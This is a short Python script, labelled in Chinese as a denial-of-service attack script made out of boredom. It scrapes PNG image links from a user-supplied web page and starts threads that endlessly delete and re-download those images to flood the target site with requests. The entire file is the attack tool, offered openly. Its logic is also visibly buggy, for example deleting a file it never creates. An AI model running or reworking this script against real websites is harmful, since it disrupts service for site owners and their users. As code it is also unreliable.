###豚鼠萌君DOS攻击脚本###
print("""
  ________
 /        \
|          |
\  ()   () |

|          |
|    ---   |    <---此脚本由豚鼠萌君无聊制作--->
|          |
 \_________/


""")

import urllib.request
import os
import re
import threading



url=input('输入网址 输入完毕等待加载 加载完毕请输入mkdel()：')
f=urllib.request.urlopen(url)
html=f.read().decode('utf-8')
p=r'<img src="([^"]*\.png)"'
k=re.findall(p,html)
a=0
aaa=[]
i=''
def mk():
    global i
    for i in k:
      global a
      global aaa
      a+=1
      aaa.insert(a,i)
      print(i)
      png=urllib.request.urlopen(i)
      png1=png.read()
      file=open(str(a)+'.png','ab')
      file.write(png1)
      file.close


def mkdel():
    while 1: 
        os.remove('1.png')
        os.remove('2.png')
        os.remove('3.png')
        os.remove('4.png')
        os.remove('0.png')
        for i in range(5):
            print(aaa[i])
            png=urllib.request.urlopen(aaa[i])
            png1=png.read()
            f=open(str(i)+'.png','ab')
            f.write(png1)
            f.close()
    
def wh():
    while 1:
        if a==6:
            while 1:
                mkdel()

th_mk=threading.Thread(target=mk)
th_mk.start()

th_wh=threading.Thread(target=wh)
th_wh.start()







